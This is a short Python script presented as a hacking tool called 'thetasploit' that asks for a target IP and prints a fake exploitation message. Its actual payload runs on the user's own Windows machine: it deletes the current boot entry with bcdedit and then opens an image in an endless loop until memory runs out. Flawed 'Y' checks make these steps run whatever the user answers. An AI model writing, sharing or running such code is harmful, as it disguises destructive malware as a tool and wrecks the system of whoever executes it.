##############################################################################################################################################
##############################################################################################################################################
##############################################################################################################################################
##############################################################################################################################################
##############################################################################################################################################
########################################### DO NOT RUN FILE OUTSIDE A VIRTUAL MACHINE FOR YOUR OWN SAKE NOT MINE #############################
##############################################################################################################################################
##############################################################################################################################################
##############################################################YOU HAVE BEEN WARNED ###########################################################
##############################################################################################################################################
##############################################################################################################################################
import time
import os
def thetasploit(rhost):
    if len(rhost) <= 15:
        print(f"Target ip is {rhost} do you want to proceed? ")
        yesorno = input("Y/N: ")
        if yesorno == 'Y' or 'y':
            print("Attacking please wait... ")
            time.sleep(5)
            print("Target has been exploited you are now the owner of his machine ")
            time.sleep(1)
            destroy = input("Do you want to corrupt his system files? (Y or N): ")
            if destroy == 'Y' or 'y': #here is where the detruction starts
                os.system('"bcdedit.exe /delete {current}"') # This destroyes the bootloader for good
                while True:
                    #opens a image forever until the machine runs out of ram
                    os.startfile('troll.jpg')
        else:
            print("Quitting ")
            quit
    else:
        print("Invalid Ip")
        quit

# main guard #
if __name__ == '__main__':
    thetasploit(input("SET TARGET IP: "))